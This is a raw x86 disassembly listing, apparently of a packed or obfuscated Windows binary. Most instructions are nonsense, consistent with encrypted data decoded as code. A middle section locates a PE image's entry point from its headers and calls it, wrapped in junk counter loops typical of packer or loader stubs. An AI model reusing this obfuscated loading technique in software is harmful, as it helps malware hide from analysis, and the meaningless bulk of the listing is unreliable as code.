  4110f9:	fidiv  WORD PTR [edx-0x6070e7d7]
  4110ff:	rcr    DWORD PTR [eax],0x41
  411102:	jb     0x411091
  411104:	test   BYTE PTR [ebp+0x20016564],bh
  41110a:	push   eax
  41110b:	jae    0x411147
  41110d:	icebp  
  41110e:	sub    al,BYTE PTR [edx-0x2df9f9b1]
  411114:	xchg   ebx,eax
  411115:	pop    eax
  411116:	imul   esi,eax,0xffffffea
  411119:	gs arpl ax,si
  41111c:	sub    eax,0x56ea59fa
  411121:	lods   eax,DWORD PTR ds:[esi]
  411122:	pop    es
  411123:	sbb    cl,BYTE PTR [ebx]
  411125:	call   0xa4c9a9be
  41112a:	adc    DWORD PTR [ebp-0x3ee76c86],edi
  411130:	test   esi,esi
  411132:	aaa    
  411133:	push   ebx
  411134:	sub    eax,0x5b08786e
  411139:	(bad)  
  41113b:	jp     0x411196
  41113d:	lock dec eax
  41113f:	(bad)  [eax-0x7ce6b633]
  411145:	in     al,dx
  411146:	adc    dl,ah
  411148:	sub    eax,0x82b2a748
  41114d:	or     eax,0xd9a57bda
  411152:	pusha  
  411153:	or     al,0xf5
  411155:	(bad)  
  411156:	sti    
  411157:	shl    DWORD PTR [edx],cl
  411159:	mov    DWORD PTR [edx+0x1a60733e],edx
  41115f:	sbb    BYTE PTR [ebx+edi*4],0xf4
  411163:	test   DWORD PTR ds:0x653097c0,edx
  411169:	dec    esp
  41116a:	inc    ebp
  41116b:	(bad)  
  41116c:	aaa    
  41116d:	xchg   BYTE PTR [edx+0x76224f73],cl
  411173:	and    DWORD PTR [edx],0x40
  411176:	iret   
  411177:	clc    
  411178:	pop    esi
  411179:	or     DWORD PTR [ebx+0x28],eax
  41117c:	test   dh,0x3
  41117f:	pop    edi
  411180:	sbb    al,0x39
  411182:	sub    ch,bl
  411184:	and    esi,DWORD PTR [eax]
  411186:	fcom   DWORD PTR [ecx]
  411188:	sub    BYTE PTR [ebx-0x36f91252],bh
  41118e:	aad    0xb5
  411190:	jns    0x411116
  411192:	and    al,0xbb
  411194:	pop    esp
  411195:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411196:	retf   
  411197:	outs   dx,BYTE PTR ds:[esi]
  411198:	mov    esp,DWORD PTR [ebp+0x74]
  41119b:	rcr    DWORD PTR [edi],1
  41119d:	xchg   edx,eax
  41119e:	stos   DWORD PTR es:[edi],eax
  41119f:	xchg   esi,eax
  4111a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111a1:	loope  0x411142
  4111a3:	lea    ebx,ds:0x88283b41
  4111a9:	jno    0x411178
  4111ab:	jo     0x411180
  4111ad:	adc    DWORD PTR cs:[edi+0x41],eax
  4111b1:	and    cl,BYTE PTR ds:0x20a1d170
  4111b7:	and    ah,BYTE PTR [edi+0x299f8c19]
  4111bd:	loope  0x411217
  4111bf:	jne    0x411192
  4111c1:	push   0x68938496
  4111c6:	add    dl,BYTE PTR [ebx]
  4111c8:	jl     0x411152
  4111ca:	cld    
  4111cb:	mov    bl,0xaf
  4111cd:	imul   esp,DWORD PTR [edi-0x2e3b6042],0x7f
  4111d4:	add    DWORD PTR [ebx+0xf1de51d],ebp
  4111da:	jg     0x4111f4
  4111dc:	ds leave 
  4111de:	enter  0x9ac8,0x5d
  4111e2:	pop    esi
  4111e3:	(bad)  [edi+0x62]
  4111e6:	jns    0x4111a3
  4111e8:	out    dx,al
  4111e9:	scas   al,BYTE PTR es:[edi]
  4111ea:	sub    ebx,eax
  4111ec:	fsubr  QWORD PTR [esi-0x2aaa9b86]
  4111f2:	pop    ebp
  4111f3:	push   esp
  4111f4:	sub    BYTE PTR [ecx],0xb9
  4111f7:	pop    es
  4111f8:	into   
  4111f9:	loop   0x4111ed
  4111fb:	pop    ebx
  4111fc:	and    DWORD PTR [edx+0x7],0x5a
  411200:	or     eax,0x71848d9e
  411205:	sub    dh,bl
  411207:	mov    edx,DWORD PTR [esi-0x7e668bed]
  41120d:	iret   
  41120e:	pop    edx
  41120f:	clc    
  411210:	inc    ebx
  411211:	xchg   ecx,eax
  411212:	mov    ds,WORD PTR [edx-0x55cdde73]
  411218:	pop    ds
  411219:	add    eax,0xa5e96f6a
  41121e:	adc    dh,BYTE PTR cs:[esi+0x12]
  411222:	in     eax,dx
  411223:	push   edi
  411225:	xor    ch,BYTE PTR [ebp-0x2bd82e84]
  41122b:	adc    DWORD PTR [edx],ecx
  41122d:	push   esp
  41122e:	test   BYTE PTR [edx],ch
  411230:	lods   al,BYTE PTR ds:[esi]
  411231:	in     eax,dx
  411232:	mov    ebp,0x38ea376f
  411237:	mul    esp
  411239:	inc    ebx
  41123a:	shl    BYTE PTR ds:0x7d7b451c,1
  411240:	out    dx,eax
  411241:	aas    
  411242:	aaa    
  411243:	and    BYTE PTR [esi-0x53],al
  411246:	out    dx,eax
  411247:	sub    DWORD PTR [esi-0x29c261e3],esp
  41124d:	add    DWORD PTR [ebx+0x59],ebp
  411250:	rcl    BYTE PTR [esi-0x5b],1
  411253:	inc    eax
  411254:	hlt    
  411255:	shr    DWORD PTR [ebp+edx*2-0x4],0x8f
  41125a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41125b:	ins    BYTE PTR es:[edi],dx
  41125c:	retf   0x6f94
  41125f:	ds mov BYTE PTR es:[eax-0x31564e00],bl
  411267:	hlt    
  411268:	rcr    DWORD PTR [edx],0x31
  41126b:	sti    
  41126c:	pop    eax
  41126d:	fdivr  QWORD PTR [edi]
  41126f:	dec    edx
  411270:	in     al,0x5d
  411272:	bound  edx,QWORD PTR [ebp-0x76]
  411275:	out    dx,eax
  411276:	cmp    BYTE PTR [edi+ebx*4],dl
  411279:	sti    
  41127a:	cmc    
  41127b:	mov    esi,0x51abaeeb
  411280:	(bad)
  411283:	adc    al,0xa9
  411285:	in     al,0xa3
  411287:	jle    0x41124f
  411289:	and    eax,0xfa462028
  41128e:	ret    
  41128f:	out    0x2c,eax
  411291:	fistp  QWORD PTR [eax+0x309679a5]
  411297:	mov    al,0x2
  411299:	push   ecx
  41129a:	fmul   QWORD PTR [esi+0x3bd7dca8]
  4112a0:	dec    BYTE PTR [ebx+0x62]
  4112a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112a4:	lea    bx,[eax-0xf71f380]
  4112ab:	mov    ds:0xda2d73be,eax
  4112b0:	dec    esi
  4112b1:	sbb    BYTE PTR [eax+0x6a27a6f2],0xf4
  4112b8:	lds    edi,FWORD PTR [edx+0x3c]
  4112bb:	jbe    0x4112c0
  4112bd:	neg    DWORD PTR [edi]
  4112bf:	dec    edx
  4112c0:	lea    ebx,ds:0xc93ccc9c
  4112c6:	push   esp
  4112c7:	sub    eax,0x599684ec
  4112cc:	(bad)  
  4112cd:	call   0x898f:0x4b318b0d
  4112d4:	jmp    0x3b2c2a59
  4112d9:	ret    
  4112da:	jmp    0x9106:0xcdb8b318
  4112e1:	xor    DWORD PTR [ebx-0x5a],esi
  4112e4:	arpl   WORD PTR [eax+0x33457864],cx
  4112ea:	lock mov eax,DWORD PTR [edx+0x194]
  4112f1:	mov    ecx,DWORD PTR [eax]
  4112f3:	mov    eax,DWORD PTR [ecx+0x3c]
  4112f6:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4112fa:	add    eax,ecx
  4112fc:	mov    DWORD PTR [ebp+0x8],esi
  4112ff:	mov    DWORD PTR [ebp+0x10],eax
  411302:	mov    eax,DWORD PTR [ebp+0x10]
  411305:	pop    esi
  411306:	test   eax,eax
  411308:	je     0x41132c
  41130e:	push   DWORD PTR ds:0x414bd6
  411314:	push   DWORD PTR ds:0x414982
  41131a:	mov    eax,DWORD PTR [edx+0x194]
  411320:	push   DWORD PTR [eax]
  411322:	mov    eax,DWORD PTR [ebp+0x10]
  411325:	call   eax
  411327:	jmp    0x41132f
  41132c:	mov    eax,DWORD PTR [ebp+0x10]
  41132f:	leave  
  411330:	ret    0xc
  411333:	push   ebp
  411334:	mov    ebp,esp
  411336:	sub    esp,0x30
  411339:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  411340:	mov    ecx,DWORD PTR ds:0x434603
  411346:	xor    DWORD PTR ds:0x4345cf,ecx
  41134c:	mov    DWORD PTR [ebp-0x18],0xf89c8539
  411353:	mov    DWORD PTR ds:0x4344ff,0x14
  41135d:	cmp    DWORD PTR ds:0x4344ff,0x0
  411364:	je     0x4113b9
  41136a:	cmp    DWORD PTR ds:0x4344ff,0x3
  411371:	jne    0x411387
  411377:	push   0x43477a
  41137c:	push   0x400000
  411381:	call   DWORD PTR ds:0x4130d8
  411387:	cmp    DWORD PTR ds:0x4344ff,0x4
  41138e:	jne    0x41139f
  411394:	mov    eax,ds:0x4344ff
  411399:	dec    eax
  41139a:	mov    ds:0x4344ff,eax
  41139f:	mov    eax,ds:0x4344ff
  4113a4:	dec    eax
  4113a5:	mov    ds:0x4344ff,eax
  4113aa:	jmp    0x41135d
  4113af:	adc    DWORD PTR ds:0x4344ef,0x46ae
  4113b9:	mov    ecx,DWORD PTR [ebp-0x4]
  4113bc:	and    DWORD PTR ds:0x434543,0x0
  4113c6:	jmp    0x4113d6
  4113cb:	mov    eax,ds:0x434543
  4113d0:	inc    eax
  4113d1:	mov    ds:0x434543,eax
  4113d6:	cmp    DWORD PTR ds:0x434543,0x18
  4113dd:	jae    0x411423
  4113e3:	cmp    DWORD PTR ds:0x434543,0xf
  4113ea:	jne    0x411406
  4113f0:	push   0x43457f
  4113f5:	push   0x4743
  4113fa:	push   DWORD PTR [ebp-0x1c]
  4113fd:	push   DWORD PTR [ebp-0x10]
  411400:	call   DWORD PTR ds:0x4132ac
  411406:	cmp    DWORD PTR ds:0x434543,0xe
  41140d:	jne    0x41141e
  411413:	mov    eax,ds:0x434543
  411418:	inc    eax
  411419:	mov    ds:0x434543,eax
  41141e:	jmp    0x4113cb
  411423:	push   ebx
  411424:	mov    eax,0x7510851
  411429:	xor    ecx,eax
  41142b:	and    DWORD PTR ds:0x43460f,0x0
  411435:	mov    ebx,DWORD PTR ds:0x43460f
  41143b:	inc    ebx
  41143c:	mov    DWORD PTR ds:0x43460f,ebx
  411442:	cmp    DWORD PTR ds:0x43460f,0x6
  411449:	jne    0x411462
  41144f:	push   DWORD PTR [ebp-0x10]
  411452:	push   0x434593
  411457:	push   0x4346db
  41145c:	call   DWORD PTR ds:0x413360
  411462:	cmp    DWORD PTR ds:0x43460f,0x5
  411469:	jne    0x41147c
  41146f:	mov    ebx,DWORD PTR ds:0x43460f
  411475:	inc    ebx
  411476:	mov    DWORD PTR ds:0x43460f,ebx
  41147c:	cmp    DWORD PTR ds:0x43460f,0x10
  411483:	jb     0x411435
  411489:	movzx  ebx,WORD PTR ds:0x4344df
  411490:	adc    DWORD PTR ds:0x4345c7,ebx
  411496:	mov    ebx,0x327299
  41149b:	xor    DWORD PTR ds:0x434583,0x577
  4114a5:	add    ecx,ebx
  4114a7:	or     DWORD PTR ds:0x434603,0x4344e7
  4114b1:	mov    DWORD PTR [ebp-0x1c],ecx
  4114b4:	sbb    DWORD PTR ds:0x4345d3,edi
  4114ba:	mov    ecx,DWORD PTR [ebp+0x14]
  4114bd:	xor    DWORD PTR ds:0x4345f7,0x4344f3
  4114c7:	push   esi
  4114c8:	mov    DWORD PTR ds:0x4345cb,0x24af
  4114d2:	push   edi
  4114d3:	sbb    DWORD PTR ds:0x4344ff,0x43453f
  4114dd:	test   ecx,ecx
  4114df:	je     0x41155f
  4114e5:	mov    ecx,DWORD PTR [ebp+0x14]
  4114e8:	sbb    DWORD PTR ds:0x434613,edx
  4114ee:	mov    ecx,DWORD PTR [ecx]
  4114f0:	and    DWORD PTR ds:0x4344ff,0x0
  4114fa:	xor    edi,edi
  4114fc:	or     edi,DWORD PTR ds:0x4344ff
  411502:	inc    edi
  411503:	mov    DWORD PTR ds:0x4344ff,edi
  411509:	cmp    DWORD PTR ds:0x4344ff,0xb
  411510:	jne    0x411529
  411516:	push   0x434607
  41151b:	push   DWORD PTR [ebp-0x28]
  41151e:	push   0x707e
  411523:	call   DWORD PTR ds:0x4132b0
  411529:	cmp    DWORD PTR ds:0x4344ff,0xa
  411530:	jne    0x411545
  411536:	xor    edi,edi
  411538:	add    edi,DWORD PTR ds:0x4344ff
  41153e:	inc    edi
  41153f:	mov    DWORD PTR ds:0x4344ff,edi
  411545:	cmp    DWORD PTR ds:0x4344ff,0x14
  41154c:	jb     0x4114fa
  411552:	mov    DWORD PTR ds:0x4344e7,0x18c9
  41155c:	mov    DWORD PTR [ebp-0x1c],ecx
  41155f:	mov    DWORD PTR ds:0x4344f7,0x1a
  411569:	cmp    DWORD PTR ds:0x4344f7,0x0
  411570:	je     0x4115ca
  411576:	cmp    DWORD PTR ds:0x4344f7,0xb
  41157d:	jne    0x411592
  411583:	push   DWORD PTR [ebp-0x14]
  411586:	push   DWORD PTR [ebp-0x14]
  411589:	push   DWORD PTR [ebp-0x14]
  41158c:	call   DWORD PTR ds:0x4130dc
  411592:	cmp    DWORD PTR ds:0x4344f7,0xc
  411599:	jne    0x4115ac
  41159f:	mov    edi,DWORD PTR ds:0x4344f7
  4115a5:	dec    edi
  4115a6:	mov    DWORD PTR ds:0x4344f7,edi
  4115ac:	mov    edi,DWORD PTR ds:0x4344f7
  4115b2:	dec    edi
  4115b3:	mov    DWORD PTR ds:0x4344f7,edi
  4115b9:	jmp    0x411569
  4115be:	mov    ecx,DWORD PTR ds:0x4344eb
  4115c4:	adc    DWORD PTR ds:0x4344e3,ecx
  4115ca:	imul   edx,eax
  4115cd:	mov    ecx,0x4573
  4115d2:	mov    DWORD PTR ds:0x43460b,0x1d
  4115dc:	cmp    DWORD PTR ds:0x43460b,0x0
  4115e3:	je     0x41162d
  4115e9:	cmp    DWORD PTR ds:0x43460b,0xc
  4115f0:	jne    0x4115ff
  4115f6:	push   DWORD PTR [ebp-0x1c]
  4115f9:	call   DWORD PTR ds:0x4130e0
  4115ff:	cmp    DWORD PTR ds:0x43460b,0xd
  411606:	jne    0x41161b
  41160c:	xor    edi,edi
  41160e:	xor    edi,DWORD PTR ds:0x43460b
  411614:	dec    edi
  411615:	mov    DWORD PTR ds:0x43460b,edi
  41161b:	mov    edi,DWORD PTR ds:0x43460b
  411621:	dec    edi
  411622:	mov    DWORD PTR ds:0x43460b,edi
  411628:	jmp    0x4115dc
  41162d:	add    edx,ecx
  41162f:	jmp    0x41182f
  411634:	rol    DWORD PTR [edi+0x7d4a654a],cl
  41163a:	std    
  41163b:	mov    cl,0xe9
  41163d:	xchg   ebp,eax
  41163e:	inc    edx
  41163f:	jg     0x411697
  411641:	mov    DWORD PTR [ecx-0x2c],edx
  411644:	(bad)  
  411648:	pop    ecx
  411649:	jg     0x4116c9
  41164b:	jle    0x411612
  41164d:	jmp    0x4115de
  41164f:	push   0xffffffe9
  411651:	add    DWORD PTR [edi+0x19],ebp
  411654:	push   0xa727eeac
  411659:	aam    0x6a
  41165b:	lds    edx,FWORD PTR [edi]
  41165d:	cmp    cl,BYTE PTR [eax+ebp*2]
  411660:	add    eax,0x569b0d17
  411665:	jne    0x41161e
  411667:	and    ah,dl
  411669:	sbb    eax,0x971d443d
  41166e:	popa   
  41166f:	loope  0x4116c4
  411671:	xchg   edi,eax
  411672:	sahf   
  411673:	jp     0x4116e2
  411675:	jmp    0xe2554b06
  41167a:	aad    0xd4
  41167c:	xchg   esp,eax
  41167d:	stc    
  41167e:	push   0xa49c6436
  411683:	fnstenv [ecx+0xf45e675]
  411689:	or     al,0x3a
  41168b:	sbb    BYTE PTR [esi],ah
  41168d:	rol    dh,0x95
  411690:	or     edi,DWORD PTR [eax+0x25c47e6e]
  411696:	lahf   
  411697:	dec    ecx
  411698:	je     0x41162a
  41169a:	inc    DWORD PTR [ecx-0x7d]
  41169d:	arpl   WORD PTR [ebx+0x5c],ax
  4116a0:	es loop 0x411670
  4116a3:	push   ss
  4116a4:	xchg   edx,eax
  4116a5:	call   0x69d2:0x40c48576
  4116ac:	push   ss
  4116ad:	push   edi
  4116ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116af:	jae    0x4116a6
  4116b1:	repz test BYTE PTR [ebx-0x63],0x4c
  4116b6:	test   BYTE PTR [ebp-0x34f52ff4],ah
  4116bc:	xchg   ebp,eax
  4116bd:	sbb    al,0x4
  4116bf:	je     0x4116b4
  4116c1:	or     al,0x3c
  4116c3:	popf   
  4116c4:	sub    eax,0x24816b6b
  4116c9:	mov    ecx,eax
  4116cb:	fmul   QWORD PTR [eax+0x7a]
  4116ce:	sbb    al,0x39
  4116d0:	adc    dl,bl
  4116d2:	cmp    eax,0x78059e93
  4116d7:	adc    bh,al
  4116d9:	mov    eax,0x83735952
  4116de:	lds    eax,FWORD PTR [ecx-0x5e]
  4116e1:	or     al,BYTE PTR [esi+0x61]
  4116e4:	popa   
  4116e5:	jg     0x411750
  4116e7:	pusha  
  4116e8:	mov    cl,0x78
  4116ea:	jmp    0x8689:0xe72ec227
  4116f1:	and    BYTE PTR [eax],al
  4116f3:	cdq    
  4116f4:	mov    ah,0x1f
  4116f6:	pushf  
  4116f7:	xor    BYTE PTR [edi],dl
  4116f9:	jns    0x411692
  4116fb:	push   edi
  4116fc:	cld    
  4116fd:	and    ebx,ebx
  4116ff:	jmp    0x4116eb
  411701:	add    BYTE PTR [ebp+0x76],dl
  411704:	icebp  
  411705:	jle    0x4116cd
  411707:	ds hlt 
  411709:	mov    bl,0x7b
  41170b:	btc    DWORD PTR [ebx-0x1abb42ee],eax
  411712:	adc    al,0x3b
  411714:	div    cl
  411716:	sahf   
  411717:	add    ecx,0x57
  41171a:	mov    bh,0x28
  41171c:	retf   0xce5e
  41171f:	xchg   esp,eax
  411720:	and    eax,0x136e8b8b
  411725:	(bad)  
  411727:	idiv   DWORD PTR [edx+esi*1+0x4b]
  41172b:	ins    DWORD PTR es:[edi],dx
  41172c:	push   cs
  41172d:	sar    BYTE PTR es:[edi+0x4a],cl
  411731:	inc    esi
  411732:	jo     0x4116d2
  411734:	dec    ebp
  411735:	pop    ebx
  411736:	sahf   
  411737:	pop    ecx
  411739:	in     al,0x47
  41173b:	add    edx,DWORD PTR [ebp-0x1eaa7110]
  411741:	push   0xdf6fb1d0
  411746:	stos   DWORD PTR es:[edi],eax
  411747:	nop
  411748:	aam    0x78
  41174a:	jae    0x4116f7
  41174c:	dec    edi
  41174d:	call   0xcd0d:0xfdd3bc
  411754:	jbe    0x4117bc
  411756:	pop    ss
  411757:	dec    esp
  411758:	inc    esp
  411759:	dec    esp
  41175a:	or     eax,0x715cc53e
  41175f:	in     eax,dx
  411760:	or     eax,0x62d0e494
  411765:	arpl   bp,ax
  411767:	retf   0x2925
  41176a:	mov    eax,0xb51fee64
  41176f:	lahf   
  411770:	push   ss
  411771:	mov    eax,0x6a84f5a4
  411776:	adc    esp,edi
  411778:	xor    al,0x89
  41177a:	adc    eax,0xa32007dc
  41177f:	jnp    0x411721
  411781:	mov    esp,0xfaffd359
  411786:	pop    esp
  411787:	hlt    
  411788:	dec    ebp
  411789:	ins    BYTE PTR es:[edi],dx
  41178a:	stos   DWORD PTR es:[edi],eax
  41178b:	jmp    0xa0084de6
  411790:	cmc    
  411791:	shl    BYTE PTR [ecx],1
  411793:	inc    ecx
  411794:	cwde   
  411795:	add    BYTE PTR [eax],dl
  411797:	mov    bl,0x9d
  411799:	shl    DWORD PTR [edi-0x5619ca2d],cl
  41179f:	xlat   BYTE PTR ds:[ebx]
  4117a0:	in     al,dx
  4117a1:	xor    ebx,esi
  4117a3:	js     0x411756
  4117a5:	pop    ds
  4117a6:	int3   
  4117a7:	xchg   edx,eax
  4117a8:	pop    ecx
  4117a9:	mov    ds:0xf6e7814b,al
  4117ae:	pop    ss
  4117af:	int3   
  4117b0:	jl     0x4117ef
  4117b2:	fsub   QWORD PTR [edi-0x5d87a6d5]
  4117b8:	xchg   ebp,eax
  4117b9:	jmp    0x43eb:0x5f702810
  4117c0:	dec    ebx
  4117c1:	int    0x81
  4117c3:	cwde   
  4117c4:	xchg   ecx,eax
  4117c5:	xchg   ebx,eax
  4117c6:	outs   dx,DWORD PTR ds:[esi]
  4117c7:	ret    
  4117c8:	pop    edi
  4117c9:	and    DWORD PTR [ecx],0x2d6793b9
  4117cf:	add    DWORD PTR [ecx-0x5b],edx
  4117d2:	adc    al,0x2a
  4117d4:	std    
  4117d5:	ss stos DWORD PTR es:[edi],eax
  4117d7:	push   edx
  4117d8:	xchg   edx,eax
  4117d9:	arpl   WORD PTR [esi],si
  4117db:	test   bl,0x91
  4117de:	inc    ebp
  4117df:	loop   0x4117c7
  4117e1:	dec    eax
  4117e2:	call   0xff24be96
  4117e7:	adc    bh,cl
  4117e9:	icebp  
  4117ea:	add    esp,DWORD PTR [ecx+ebx*8-0xf]
  4117ee:	fild   WORD PTR [eax+ebx*1]
  4117f1:	data16 shl BYTE PTR [ecx+ebx*4-0x41],cl
  4117f6:	out    0x8e,eax
  4117f8:	out    dx,al
  4117f9:	push   esi
  4117fa:	lods   eax,DWORD PTR ds:[esi]
  4117fb:	push   esi
  4117fc:	push   ss
  4117fd:	or     esp,DWORD PTR [edx-0x26d1c46]
  411803:	aas    
  411804:	add    BYTE PTR [ebx-0x7a],ah
  411807:	fcom   QWORD PTR [edi-0x40]
  41180a:	jnp    0x411882
  41180c:	stos   BYTE PTR es:[edi],al
  41180d:	add    BYTE PTR [eax+0x5d],dl
  411810:	push   esi
  411811:	pop    esp
  411812:	lahf   
  411813:	mov    ebx,edx
  411815:	sbb    ah,BYTE PTR ds:0x6364e048
  41181b:	or     BYTE PTR [ebx+0x42],cl
  41181e:	test   BYTE PTR [edi],al
  411820:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411821:	pop    edi
  411822:	or     cl,dl
  411824:	aas    
  411825:	and    ebx,DWORD PTR [eax+0x7951b558]
  41182b:	imul   edx,ecx,0x23
  41182e:	push   edi
  41182f:	mov    esi,0x7879
  411834:	or     edi,0x33cc
  41183a:	mov    edi,0x1556
  41183f:	jmp    0x411a3f
  411844:	retf   0x898a
  411847:	outs   dx,DWORD PTR ds:[esi]
  411848:	dec    ecx
  411849:	jne    0x41183f
  41184b:	stos   DWORD PTR es:[edi],eax
  41184c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41184d:	loope  0x411863
  41184f:	lods   al,BYTE PTR ds:[esi]
  411850:	xchg   ecx,eax
  411851:	and    DWORD PTR [edx+0x7e54ea40],edx
  411857:	jle    0x4118b2
  411859:	jg     0x4118d9
  41185b:	jle    0x4117f7
  41185d:	retf   0xecdb
  411860:	mov    eax,0x6163836e
  411865:	in     al,0x93
  411867:	loop   0x411845
  411869:	js     0x41183f
  41186b:	test   al,0xf3
  41186d:	mov    edx,DWORD PTR [ebp+0x31229a25]
  411873:	adc    esp,DWORD PTR [eax+0x74a4a043]
  411879:	fsub   QWORD PTR [esi+0x43]
  41187c:	pop    eax
  41187d:	mov    eax,ds:0x7223ec4e
  411882:	jnp    0x411884
  411884:	push   edx
  411885:	clc    
  411886:	in     eax,dx
  411887:	lahf   
  411888:	sub    al,BYTE PTR [ebx-0x6]
  41188b:	push   edx
  41188c:	xchg   ecx,eax
  41188d:	dec    edx
  41188e:	dec    ecx
  41188f:	push   eax
  411890:	adc    BYTE PTR [esi-0x2561e3c0],0x4b
  411897:	mov    eax,ds:0x26728786
  41189c:	gs mov bh,0x74
  41189f:	je     0x4118b9
  4118a1:	adc    al,0x97
  4118a3:	pop    ebx
  4118a4:	or     al,0xff
  4118a6:	je     0x4118b7
  4118a8:	inc    ebp
  4118a9:	or     al,0x5f
  4118ab:	(bad)  
  4118ac:	dec    esp
  4118ad:	push   ebx
  4118ae:	sub    bh,BYTE PTR [ecx+0x64]
  4118b1:	mov    edx,0x93b09cb8
  4118b6:	(bad)
  4118bb:	adc    eax,0x786fe3a8
  4118c0:	push   ss
  4118c1:	sar    DWORD PTR [edi+0x0],1
  4118c4:	mov    ds:0xe7e1dc0d,eax
  4118c9:	mov    dl,0xbf
  4118cb:	cs dec esp
  4118cd:	jecxz  0x41186e
  4118cf:	mov    al,0x47
  4118d1:	pop    ecx
  4118d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118d3:	sti    
  4118d4:	dec    esp
  4118d5:	stos   DWORD PTR es:[edi],eax
  4118d6:	sub    BYTE PTR [edi-0x2d0d75fe],cl
  4118dc:	xchg   edi,eax
  4118dd:	cmp    dh,BYTE PTR [edi-0x5ab5a638]
  4118e3:	enter  0x3fe7,0xe7
  4118e7:	outs   dx,DWORD PTR ds:[esi]
  4118e9:	stos   DWORD PTR es:[edi],eax
  4118ea:	stos   DWORD PTR es:[edi],eax
  4118eb:	mov    esi,DWORD PTR [edx+0x779a9ca9]
  4118f1:	aaa    
  4118f2:	pop    ss
  4118f3:	int3   
  4118f4:	pop    esp
  4118f5:	xchg   esi,eax
  4118f6:	push   0x2d0df9fa
  4118fb:	repz mov eax,ds:0x9b735d7e
  411901:	and    al,0x89
  411903:	inc    edx
  411904:	push   eax
  411905:	push   eax
  411906:	jne    0x411962
  411908:	inc    ebp
  411909:	shl    DWORD PTR ds:0xf2db32dc,cl
  41190f:	mov    bh,BYTE PTR [esp+eiz*4-0xb]
  411913:	dec    esi
  411914:	jmp    0xa685:0x8241a087
  41191b:	dec    eax
  41191c:	lods   eax,DWORD PTR ds:[esi]
  41191d:	mov    ecx,ebp
  41191f:	addr16 sbb dl,cl
  411922:	jb     0x41196f
  411924:	pop    ebp
  411925:	xor    al,0x2c
  411927:	enter  0xba53,0xb
  41192b:	jle    0x4118b6
  41192d:	sti    
  41192e:	sti    
  41192f:	cmc    
  411930:	scas   eax,DWORD PTR es:[edi]
  411931:	lock pop ebx
  411933:	stc    
  411934:	sbb    bh,BYTE PTR [esi+0x49]
  411937:	jmp    0x11c3:0xee1658cc
  41193e:	inc    esp
  41193f:	add    edi,DWORD PTR [eax]
  411941:	jns    0x41199b
  411943:	mov    eax,ds:0x537bd87d
  411948:	scas   al,BYTE PTR es:[edi]
  411949:	int3   
  41194a:	mov    ds:0xf333f507,al
  41194f:	mov    al,ds:0xeda1664a
  411954:	js     0x41190d
  411956:	mov    ah,dh
  411958:	xchg   esi,eax
  411959:	and    ecx,ebp
  41195b:	mov    edx,0x361dbc50
  411960:	rcl    BYTE PTR ds:0xab183bb9,1
  411966:	les    ebp,FWORD PTR [ecx-0x72bea182]
  41196c:	in     eax,dx
  41196d:	sbb    bl,BYTE PTR [ecx-0x64]
  411970:	sahf   
  411971:	dec    esp
  411972:	or     BYTE PTR [esi],ch
  411974:	pop    ecx
  411975:	jmp    0xfb32679c
  41197a:	adc    eax,0xf24e2df6
  41197f:	mov    dh,0xb2
  411981:	cli    
  411982:	lods   eax,DWORD PTR ds:[esi]
  411983:	push   esi
  411984:	jbe    0x4119e2
  411986:	icebp  
  411987:	mov    ds:0x5ac75ae2,eax
  41198c:	xchg   ecx,eax
  41198d:	aam    0x20
  41198f:	test   al,0x81
  411991:	or     eax,0xe15f1f69
  411996:	mov    ebp,DWORD PTR [edi-0x1c6e5798]
  41199c:	jmp    0x4119d1
  41199e:	ins    DWORD PTR es:[edi],dx
  41199f:	mov    esi,0xdc469cef
  4119a4:	pop    ss
  4119a5:	lds    ecx,FWORD PTR [ecx+0x235a5b31]
  4119ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119ac:	out    0x9,al
  4119ae:	xor    BYTE PTR [ebp-0x5a],0x31
  4119b2:	dec    esi
  4119b3:	dec    eax
  4119b4:	test   DWORD PTR [esi-0x54],ebx
  4119b7:	icebp  
  4119b8:	mov    ch,0x16
  4119ba:	in     al,0x63
  4119bc:	clc    
  4119bd:	cmp    ecx,DWORD PTR [edi+edi*4]
  4119c0:	xor    eax,0xf3d719c
  4119c5:	add    esp,DWORD PTR [edx]
  4119c7:	adc    edx,DWORD PTR [ebx+0x11]
  4119ca:	int    0xa2
  4119cc:	cli    
  4119cd:	pop    esi
  4119ce:	pop    esi
  4119cf:	ja     0x41199e
  4119d1:	cli    
  4119d2:	mov    eax,0xb9401948
  4119d7:	loopne 0x411a4e
  4119d9:	and    BYTE PTR ss:[edi],bh
  4119dc:	push   edi
  4119dd:	into   
  4119de:	das    
  4119df:	push   ds
  4119e0:	jl     0x411984
  4119e2:	in     eax,dx
  4119e3:	jns    0x4119dc
  4119e5:	jns    0x41197e
  4119e7:	xor    eax,0xb36b56e2
  4119ec:	out    0xd9,eax
  4119ee:	add    al,BYTE PTR [ecx-0x74]
  4119f1:	lds    esi,FWORD PTR ds:0xaa3d84a6
  4119f7:	scas   eax,DWORD PTR es:[edi]
  4119f8:	out    0x4f,eax
  4119fa:	cmp    eax,0xef37ece3
  4119ff:	rol    DWORD PTR [ebx-0x2256992e],1
  411a05:	out    dx,al
  411a06:	hlt    
  411a07:	fs cld 
  411a09:	inc    edi
  411a0a:	(bad)  
  411a0b:	cmc    
  411a0c:	test   al,0xc6
  411a0e:	repnz sub bl,dh
  411a11:	ds mov eax,0x8078c7f3
  411a17:	add    BYTE PTR [esi+0x0],bl
  411a1a:	xchg   edx,eax
  411a1b:	stos   BYTE PTR es:[di],al
  411a1d:	add    BYTE PTR [eax+0x50],cl
  411a20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a21:	push   esi
  411a22:	sub    dl,BYTE PTR fs:[ebp+0x76]
  411a26:	std    
  411a27:	mov    edx,0x33e9b997
  411a2c:	mov    ds:0x192abddf,al
  411a31:	loopne 0x4119dc
  411a33:	adc    bh,BYTE PTR [ebp+0x375244f5]
  411a39:	repnz pop esp
  411a3b:	imul   ecx,DWORD PTR [esi+0x79],0xffffffc5
